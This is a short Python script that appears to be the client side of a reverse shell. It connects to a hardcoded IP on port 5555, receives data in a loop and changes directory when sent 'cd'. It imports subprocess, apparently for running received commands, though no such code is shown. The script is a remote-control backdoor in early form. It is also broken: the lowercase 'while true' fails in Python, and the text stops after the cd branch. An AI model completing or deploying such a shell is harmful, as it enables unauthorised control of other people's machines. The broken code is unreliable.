import socket
import os
import subprocess

s = socket.socket()

host = '10.105.12.201'
port = 5555

s.connect((host,port))

while true:
	data = s.recv(1024)

	if data[:2].decode("utf-8") == 'cd':
		os.chdir(data[3:].decode("utf-8"))